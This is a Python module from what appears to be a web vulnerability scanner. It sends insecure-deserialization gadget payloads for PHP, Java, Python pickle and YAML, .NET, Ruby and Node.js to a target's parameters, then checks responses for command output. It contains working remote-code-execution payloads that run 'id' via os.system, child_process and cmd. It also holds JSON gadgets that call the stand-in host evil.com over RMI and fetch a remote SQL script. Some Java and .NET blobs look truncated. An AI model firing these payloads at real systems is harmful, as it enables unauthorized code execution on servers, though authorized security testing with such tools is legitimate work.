import re
import base64
import hashlib
import asyncio
from typing import Dict, List, Set, Optional, Tuple
from urllib.parse import urlparse, urljoin
from modules.base import BaseModule
from core.utils import extract_params, random_string


class DeserialModule(BaseModule):
    name = "deserial"
    description = "Insecure Deserialization Scanner with Gadget Chains"
    exploitable = True
    
    php_gadgets: Dict[str, str] = {
        "laravel": 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"*events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"*listeners";a:1:{s:4:"test";a:1:{i:0;s:6:"system";}}}}',
        "symfony": 'O:47:"Symfony\\Component\\Cache\\Adapter\\ProxyAdapter":2:{s:54:"Symfony\\Component\\Cache\\Adapter\\ProxyAdapternamespace";s:0:"";s:50:"Symfony\\Component\\Cache\\Adapter\\ProxyAdapterpool";O:48:"Symfony\\Component\\Cache\\Adapter\\ArrayAdapter":2:{}}',
        "wordpress": 'O:8:"WP_Theme":1:{s:13:"theme_root";s:11:"/etc/passwd";}',
        "generic_destruct": 'O:10:"TestObject":1:{s:4:"file";s:11:"/etc/passwd";}',
        "monolog": 'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:6:"socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"handler";N;s:13:"bufferSize";i:-1;s:9:"buffer";a:1:{i:0;a:2:{i:0;s:2:"id";s:5:"level";i:100;}}s:8:"level";N;s:14:"initialized";b:1;s:14:"bufferLimit";i:-1;s:13:"processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}};s:13:"bufferSize";i:-1;s:9:"buffer";a:0:{}s:8:"level";N;s:14:"initialized";b:1;s:14:"bufferLimit";i:-1;s:13:"processors";a:0:{}}}',
        "guzzle": 'O:24:"GuzzleHttp\\Psr7\\FnStream":2:{s:33:"GuzzleHttp\\Psr7\\FnStreammethods";a:1:{s:5:"close";a:2:{i:0;O:23:"GuzzleHttp\\HandlerStack":3:{s:32:"GuzzleHttp\\HandlerStackhandler";s:6:"system";s:30:"GuzzleHttp\\HandlerStackstack";a:1:{i:0;a:1:{i:0;s:2:"id";}}s:31:"GuzzleHttp\\HandlerStackcached";b:0;}i:1;s:7:"resolve";}}s:35:"GuzzleHttp\\Psr7\\FnStream_fn_close";a:2:{i:0;r:4;i:1;s:7:"resolve";}}',
        "phar": 'O:8:"Closure":0:{}',
    }
    
    java_gadgets: Dict[str, str] = {
        "commons_collections": base64.b64encode(bytes([
            0xac, 0xed, 0x00, 0x05, 0x73, 0x72, 0x00, 0x32,
            0x6f, 0x72, 0x67, 0x2e, 0x61, 0x70, 0x61, 0x63,
            0x68, 0x65, 0x2e, 0x63, 0x6f, 0x6d, 0x6d, 0x6f,
            0x6e, 0x73, 0x2e, 0x63, 0x6f, 0x6c, 0x6c, 0x65,
        ])).decode(),
        "spring_core": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD",
        "jboss_weld": "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHA=",
        "beanutils": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3I=",
        "jdk7_gadget": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAABA/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOn",
        "weblogic": "rO0ABXNyABd3ZWJsb2dpYy5ybWkuaW50ZXJuYWwuTWV0aG9kRGVzY3JpcHRvcrL5X/S7X6YxAgABTAAGbWV0aG9kdAAbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDt4cHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHA=",
    }
    
    python_gadgets: Dict[str, str] = {
        "pickle_exec": base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
        "pickle_subprocess": base64.b64encode(b"csubprocess\ncheck_output\n(S'id'\ntR.").decode(),
        "pickle_builtin": base64.b64encode(b"c__builtin__\neval\n(S'__import__(\"os\").system(\"id\")'\ntR.").decode(),
        "pickle_os": base64.b64encode(b"cposix\nsystem\n(S'id'\ntR.").decode(),
        "yaml_exec": "!!python/object/apply:os.system ['id']",
        "yaml_subprocess": "!!python/object/apply:subprocess.check_output [['id']]",
        "yaml_popen": "!!python/object/apply:subprocess.Popen [['id']]",
    }
    
    dotnet_gadgets: Dict[str, str] = {
        "typeconfuse": "AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJ",
        "objectdataprovider": "AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0uV2luZG93cy5EYXRhLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUBAAAALVN5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyAQ",
        "textformattingrunproperties": "AAEAAAD/////AQAAAAAAAAAMAQAAAE5TeXN0ZW0uV2luZG93cy5NYXJrdXAsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAACEAVN5c3RlbS5XaW5kb3dzLk1hcmt1cC5Mb2NhbGl6YWJpbGl0eQ",
        "windowsidentity": "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWF",
    }
    
    ruby_gadgets: Dict[str, str] = {
        "marshal_erb": base64.b64encode(b'\x04\x08o:\x13RubyVM::InstructionSequence\x00').decode(),
        "marshal_drb": base64.b64encode(b'\x04\x08U:\x0eDRb::RefError\x08').decode(),
        "marshal_oj": base64.b64encode(b'\x04\x08o:\nGem::SpecFetcher\x00').decode(),
    }
    
    node_gadgets: Dict[str, str] = {
        "node_serialize": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\',function(error,stdout,stderr){console.log(stdout)});}()"}',
        "prototype_rce": '{"__proto__":{"shell":"/proc/self/exe","argv0":"console.log(require(\'child_process\').execSync(\'id\').toString())","NODE_OPTIONS":"--require /proc/self/cmdline"}}',
        "cryo_exploit": '{"__proto__": {"polluted": "yes"}, "x": {"__proto__": {"type": "Buffer", "data": [72, 101, 108, 108, 111]}}}',
    }
    
    async def scan(self, target: str):
        self.findings = []
        self.vulnerable_endpoints: List[Dict] = []
        self.detected_formats: Set[str] = set()
        
        params = extract_params(target)
        callback_host = self.config.get("callback_host")
        parsed = urlparse(target)
        base_url = urljoin(target, "/")
        
        resp = await self.http.get(target)
        if resp.get("status"):
            self._detect_serialization_format(target, resp)
        
        test_tasks = []
        if params:
            test_tasks.extend([
                self._test_php_deserialization(target, params),
                self._test_java_deserialization(target, params, callback_host),
                self._test_python_deserialization(target, params),
                self._test_dotnet_deserialization(target, params),
                self._test_ruby_deserialization(target, params),
                self._test_node_deserialization(target, params),
            ])
        
        test_tasks.extend([
            self._check_cookies_for_serialization(target),
            self._test_viewstate(target),
            self._test_json_deserialization(target),
        ])
        
        await asyncio.gather(*test_tasks, return_exceptions=True)
        
        return self.findings
    
    def _detect_serialization_format(self, target: str, resp: Dict):
        text = resp.get("text", "")
        headers = resp.get("headers", {})
        detections: List[Tuple[str, str]] = []
        
        if re.search(r'O:\d+:"[^"]+":\d+:{', text):
            detections.append(("PHP", "Object serialization pattern"))
            self.detected_formats.add("php")
        
        if re.search(r'a:\d+:{', text):
            detections.append(("PHP", "Array serialization"))
            self.detected_formats.add("php")
        
        java_sigs = [b'\xac\xed\x00\x05', "rO0AB", "H4sIAAAA"]
        for sig in java_sigs:
            if isinstance(sig, bytes):
                if sig in text.encode("latin-1", errors="ignore"):
                    detections.append(("Java", "Magic bytes"))
                    self.detected_formats.add("java")
                    break
            elif sig in text:
                detections.append(("Java", f"Base64 signature: {sig}"))
                self.detected_formats.add("java")
                break
        
        python_sigs = ["gASV", "gANj", "Y3BpY2ts", "Y29z"]
        for sig in python_sigs:
            if sig in text:
                detections.append(("Python Pickle", f"Signature: {sig}"))
                self.detected_formats.add("python")
                break
        
        dotnet_sigs = ["AAEAAAD/", "AAQAAAD/"]
        for sig in dotnet_sigs:
            if sig in text:
                detections.append((".NET", f"Signature: {sig}"))
                self.detected_formats.add("dotnet")
                break
        
        ruby_sigs = [b'\x04\x08', "BAh"]
        for sig in ruby_sigs:
            if isinstance(sig, bytes):
                if sig in text.encode("latin-1", errors="ignore"):
                    detections.append(("Ruby Marshal", "Magic bytes"))
                    self.detected_formats.add("ruby")
                    break
            elif sig in text:
                detections.append(("Ruby Marshal", "Base64 signature"))
                self.detected_formats.add("ruby")
                break
        
        content_type = headers.get("Content-Type", "")
        if "application/x-java-serialized-object" in content_type:
            detections.append(("Java", "Content-Type header"))
            self.detected_formats.add("java")
        
        for fmt, evidence in detections:
            self.add_finding(
                "MEDIUM",
                f"{fmt} Serialized Data Detected",
                url=target,
                evidence=evidence
            )
    
    async def _test_php_deserialization(self, target: str, params: List[str]):
        for param in params:
            for gadget_name, gadget in self.php_gadgets.items():
                for encoding in [lambda x: x, lambda x: base64.b64encode(x.encode()).decode()]:
                    payload = encoding(gadget)
                    payload_hash = hashlib.md5(payload.encode()).hexdigest()[:8]
                    
                    resp = await self.test_param(target, param, payload)
                    
                    if resp.get("status"):
                        text = resp.get("text", "").lower()
                        
                        rce_patterns = ["uid=", "gid=", "root:", "www-data"]
                        for pattern in rce_patterns:
                            if pattern in text:
                                self.add_finding(
                                    "CRITICAL",
                                    f"PHP Deserialization RCE ({gadget_name})",
                                    url=target,
                                    parameter=param,
                                    evidence="Command execution confirmed"
                                )
                                
                                self.vulnerable_endpoints.append({
                                    "type": "php",
                                    "gadget": gadget_name,
                                    "param": param,
                                })
                                
                                self.record_success(gadget, target)
                                return
                        
                        error_patterns = ["unserialize", "__wakeup", "__destruct", "serialization"]
                        for pattern in error_patterns:
                            if pattern in text:
                                self.add_finding(
                                    "HIGH",
                                    f"PHP Deserialization Endpoint ({gadget_name})",
                                    url=target,
                                    parameter=param,
                                    evidence=f"Gadget: {gadget_name}"
                                )
                                return
    
    async def _test_java_deserialization(self, target: str, params: List[str], callback_host: Optional[str] = None):
        for param in params:
            for gadget_name, gadget in self.java_gadgets.items():
                resp = await self.test_param(target, param, gadget)
                
                if resp.get("status"):
                    text = resp.get("text", "").lower()
                    
                    error_patterns = [
                        "invalidclassexception", "streamcorruptedexception",
                        "objectinputstream", "classnotfoundexception",
                        "serialversionuid", "runtimeexception"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern in text:
                            self.add_finding(
                                "CRITICAL",
                                f"Java Deserialization Endpoint",
                                url=target,
                                parameter=param,
                                evidence=f"Gadget: {gadget_name}, Pattern: {pattern}"
                            )
                            
                            self.vulnerable_endpoints.append({
                                "type": "java",
                                "gadget": gadget_name,
                                "param": param,
                            })
                            
                            self.record_success(gadget, target)
                            return
    
    async def _test_python_deserialization(self, target: str, params: List[str]):
        for param in params:
            for gadget_name, gadget in self.python_gadgets.items():
                if "yaml" in gadget_name:
                    resp = await self.http.post(
                        target,
                        data=gadget,
                        headers={"Content-Type": "application/x-yaml"}
                    )
                else:
                    resp = await self.test_param(target, param, gadget)
                
                if resp.get("status"):
                    text = resp.get("text", "")
                    
                    if "uid=" in text or "gid=" in text:
                        self.add_finding(
                            "CRITICAL",
                            f"Python Deserialization RCE ({gadget_name})",
                            url=target,
                            parameter=param,
                            evidence="Command execution successful"
                        )
                        
                        self.vulnerable_endpoints.append({
                            "type": "python",
                            "gadget": gadget_name,
                            "param": param,
                        })
                        
                        self.record_success(gadget, target)
                        return
                    
                    error_patterns = ["unpickle", "pickle", "yaml.unsafe_load", "yaml.load"]
                    for pattern in error_patterns:
                        if pattern in text.lower():
                            self.add_finding(
                                "HIGH",
                                f"Python Deserialization Endpoint",
                                url=target,
                                parameter=param,
                                evidence=f"Type: {gadget_name}"
                            )
                            return
    
    async def _test_dotnet_deserialization(self, target: str, params: List[str]):
        for param in params:
            for gadget_name, gadget in self.dotnet_gadgets.items():
                resp = await self.test_param(target, param, gadget)
                
                if resp.get("status"):
                    text = resp.get("text", "").lower()
                    
                    error_patterns = [
                        "system.runtime.serialization", "binaryformatter",
                        "objectstateformatter", "losformatter", "typeconfuse"
                    ]
                    
                    for pattern in error_patterns:
                        if pattern in text:
                            self.add_finding(
                                "CRITICAL",
                                f".NET Deserialization Endpoint",
                                url=target,
                                parameter=param,
                                evidence=f"Gadget: {gadget_name}"
                            )
                            
                            self.vulnerable_endpoints.append({
                                "type": "dotnet",
                                "gadget": gadget_name,
                                "param": param,
                            })
                            
                            self.record_success(gadget, target)
                            return
    
    async def _test_ruby_deserialization(self, target: str, params: List[str]):
        for param in params:
            for gadget_name, gadget in self.ruby_gadgets.items():
                resp = await self.test_param(target, param, gadget)
                
                if resp.get("status"):
                    text = resp.get("text", "").lower()
                    
                    error_patterns = ["marshal", "typeerror", "argumenterror", "nomethoderror"]
                    rce_patterns = ["uid=", "gid=", "root:"]
                    
                    for pattern in rce_patterns:
                        if pattern in text:
                            self.add_finding(
                                "CRITICAL",
                                f"Ruby Deserialization RCE ({gadget_name})",
                                url=target,
                                parameter=param,
                                evidence="Command execution confirmed"
                            )
                            
                            self.vulnerable_endpoints.append({
                                "type": "ruby",
                                "gadget": gadget_name,
                                "param": param,
                            })
                            
                            self.record_success(gadget, target)
                            return
                    
                    for pattern in error_patterns:
                        if pattern in text:
                            self.add_finding(
                                "HIGH",
                                f"Ruby Deserialization Endpoint",
                                url=target,
                                parameter=param,
                                evidence=f"Gadget: {gadget_name}"
                            )
                            return
    
    async def _test_node_deserialization(self, target: str, params: List[str]):
        for gadget_name, gadget in self.node_gadgets.items():
            resp = await self.http.post(
                target,
                data=gadget,
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status"):
                text = resp.get("text", "")
                
                if "uid=" in text or "gid=" in text:
                    self.add_finding(
                        "CRITICAL",
                        f"Node.js Deserialization RCE",
                        url=target,
                        evidence=f"Gadget: {gadget_name}"
                    )
                    
                    self.vulnerable_endpoints.append({
                        "type": "nodejs",
                        "gadget": gadget_name,
                    })
                    
                    self.record_success(gadget, target)
                    return
                
                if "_$$ND_FUNC$$_" in text or "node-serialize" in text.lower():
                    self.add_finding(
                        "HIGH",
                        "Node.js Deserialization Endpoint",
                        url=target,
                        evidence="node-serialize library detected"
                    )
                    return
    
    async def _test_json_deserialization(self, target: str):
        json_payloads = [
            '{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35", "MethodName": "Start", "ObjectInstance": {"$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089", "StartInfo": {"$type": "System.Diagnostics.ProcessStartInfo, System", "FileName": "cmd", "Arguments": "/c id"}}}',
            '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://evil.com/obj","autoCommit":true}',
            '{"@class":"ch.qos.logback.core.db.DriverManagerConnectionSource","url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \'http://evil.com/poc.sql\'"}',
        ]
        
        for payload in json_payloads:
            resp = await self.http.post(
                target,
                data=payload,
                headers={"Content-Type": "application/json"}
            )
            
            if resp.get("status"):
                text = resp.get("text", "").lower()
                
                if "uid=" in text or "system.diagnostics.process" in text or "rmi" in text:
                    self.add_finding(
                        "CRITICAL",
                        "JSON Deserialization RCE",
                        url=target,
                        evidence="Unsafe JSON deserializer (Newtonsoft/FastJSON)"
                    )
                    
                    self.record_success(payload[:50], target)
                    return
    
    async def _test_viewstate(self, target: str):
        resp = await self.http.get(target)
        if not resp.get("status"):
            return
        
        text = resp.get("text", "")
        
        viewstate_match = re.search(r'__VIEWSTATE[^>]*value="([^"]+)"', text)
        if viewstate_match:
            viewstate = viewstate_match.group(1)
            
            try:
                decoded = base64.b64decode(viewstate)
                if decoded[:2] == b'\xff\x01' or decoded[:2] == b'\x00\x01':
                    self.add_finding(
                        "HIGH",
                        "ASP.NET ViewState Detected",
                        url=target,
                        evidence="Unencrypted ViewState - test for deserialization"
                    )
            except Exception:
                pass
        
        generator_match = re.search(r'__VIEWSTATEGENERATOR[^>]*value="([^"]+)"', text)
        if generator_match:
            self.add_finding(
                "MEDIUM",
                "ViewState Generator Exposed",
                url=target,
                evidence=f"Generator: {generator_match.group(1)}"
            )
    
    async def _check_cookies_for_serialization(self, target: str):
        resp = await self.http.get(target)
        if not resp.get("status"):
            return
        
        cookies = resp.get("headers", {}).get("Set-Cookie", "")
        
        b64_pattern = r'[A-Za-z0-9+/=]{40,}'
        matches = re.findall(b64_pattern, cookies)
        
        for match in matches:
            try:
                decoded = base64.b64decode(match)
                
                if re.search(rb'O:\d+:"', decoded):
                    self.add_finding(
                        "HIGH",
                        "PHP Serialized Cookie",
                        url=target,
                        evidence="Cookie contains serialized PHP object"
                    )
                    return
                
                if decoded[:4] == b'\xac\xed\x00\x05':
                    self.add_finding(
                        "CRITICAL",
                        "Java Serialized Cookie",
                        url=target,
                        evidence="Cookie contains Java serialized object (RCE risk)"
                    )
                    return
                
                if decoded[:4] in [b'gASV', b'gANj', b'\x80\x04\x95']:
                    self.add_finding(
                        "HIGH",
                        "Python Pickle Cookie",
                        url=target,
                        evidence="Cookie contains pickled Python object"
                    )
                    return
                
                if decoded[:2] == b'\x04\x08':
                    self.add_finding(
                        "HIGH",
                        "Ruby Marshal Cookie",
                        url=target,
                        evidence="Cookie contains Ruby Marshal object"
                    )
                    return
            except Exception:
                pass
    
    async def exploit(self, target: str, finding: Dict):
        results = {
            "vulnerable_endpoints": self.vulnerable_endpoints,
            "detected_formats": list(self.detected_formats),
            "rce_confirmed": [],
        }
        
        for vuln in self.vulnerable_endpoints:
            if vuln["type"] in ["php", "java", "python", "dotnet", "ruby", "nodejs"]:
                results["rce_confirmed"].append({
                    "type": vuln["type"],
                    "gadget": vuln.get("gadget"),
                    "param": vuln.get("param"),
                })
        
        if results["rce_confirmed"]:
            self.add_exploit_data("deserial_rce", results)
        
        return results
    
    def get_vulnerable_endpoints(self) -> List[Dict]:
        return self.vulnerable_endpoints